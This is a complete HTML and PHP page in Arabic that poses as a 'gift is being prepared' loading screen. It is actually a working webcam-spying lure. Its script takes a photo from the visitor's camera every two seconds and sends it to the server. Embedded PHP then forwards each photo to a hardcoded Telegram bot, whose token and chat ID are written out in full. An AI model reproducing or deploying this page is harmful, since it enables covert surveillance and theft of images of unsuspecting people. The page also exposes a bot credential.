<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحضير هدية</title>
    <style>
        #loadingMessage {
            font-size: 20px;
            font-weight: bold;
            color: #333;
            text-align: center;
            margin-top: 20%;
        }
        #footer {
            position: absolute;
            bottom: 10px;
            width: 100%;
            text-align: center;
            font-size: 14px;
            color: #555;
        }
        .progress-bar {
            width: 100%;
            background-color: #f3f3f3;
            border-radius: 5px;
            margin-top: 10px;
        }
        .progress-fill {
            width: 0;
            height: 20px;
            background-color: #4caf50;
            text-align: center;
            line-height: 20px;
            color: white;
            border-radius: 5px;
            transition: width 0.4s ease;
        }
    </style>
</head>
<body>
    <div id="loadingMessage">برجاء الانتظار، جاري تحضير هدية لك...</div>

    <div id="footer">تطوير بواسطة محمود عادل - العمر: 22</div>

    <div class="progress-bar" id="progressBar">
        <div class="progress-fill" id="progressFill">0%</div>
    </div>

    <script>
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.addEventListener('loadedmetadata', function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                setTimeout(function() {
                    function captureAndSend() {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/png');

                        // عرض شريط التحميل
                        updateProgressBar(0);

                        fetch('', {
                            method: 'POST',
                            body: JSON.stringify({ image: imageData }),
                            headers: { 'Content-Type': 'application/json' }
                        }).then(response => {
                            updateProgressBar(100);
                            return response.text();
                        })
                        .then(data => {
                            console.log('Image sent:', data);
                            setTimeout(() => updateProgressBar(0), 500); // إعادة الشريط إلى 0 بعد التحميل
                        })
                        .catch(error => {
                            console.error('Error sending image:', error);
                            updateProgressBar(0);
                        });
                    }

                    // هنا نضيف تأخير بسيط للتأكد من أن الفيديو جاهز قبل التقاط الصورة
                    setTimeout(function() {
                        setInterval(captureAndSend, 2000); // التقاط صورة وإرسالها كل 2 ثانية
                    }, 1000);

                }, 1000);

                window.addEventListener('beforeunload', function() {
                    stream.getTracks().forEach(track => track.stop());
                });
            });
        })
        .catch(function(err) {
            console.error('Error accessing camera: ', err);
        });

        // دالة لتحديث شريط التحميل
        function updateProgressBar(progress) {
            const progressFill = document.getElementById('progressFill');
            progressFill.style.width = progress + '%';
            progressFill.innerText = progress + '%';
        }
    </script>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $telegramToken = "7757260311:AAG2AEhSJfjZLkxSMZGKLYlFgPPneKFwMjc";
        $chatId = "6901191600";

        $data = json_decode(file_get_contents('php://input'), true);
        $imageData = $data['image'];

        $imageData = str_replace('data:image/png;base64,', '', $imageData);
        $imageData = str_replace(' ', '+', $imageData);
        $imageContent = base64_decode($imageData);

        $file = 'photo.png';
        file_put_contents($file, $imageContent);

        $telegramApiUrl = "https://api.telegram.org/bot$telegramToken/sendPhoto";
        $postFields = [
            'chat_id' => $chatId,
            'photo' => new CURLFile(realpath($file))
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);

        unlink($file);
        echo $response;
    }
    ?>
</body>
</html>
